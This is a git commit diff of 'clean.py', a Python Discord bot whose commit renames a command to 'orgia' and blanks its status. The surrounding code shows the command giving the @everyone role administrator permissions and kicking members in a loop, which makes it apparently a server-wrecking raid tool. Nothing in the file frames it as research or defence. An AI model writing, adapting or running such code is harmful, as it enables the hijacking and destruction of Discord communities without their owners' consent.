a021e0903f5281c9c8160ebca3f45e5e39b9af1a
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 15:39:59 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -16,15 +16,15 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="Persona 3"))
+  await client.change_presence(activity=discord.Game(name=""))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
   
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
-@client.command(name="즐겁다")
-async def _clean(ctx):
+@client.command()
+async def orgia(ctx):
         every = get(ctx.guild.roles, name="@everyone")
         permissions = discord.Permissions()
         permissions.update(administrator = True)
@@ -65,4 +65,5 @@ async def _clean(ctx):
                 await member.kick()
             except:
                 print("1명 밴 못함")
+                
 client.run(os.environ['token'])
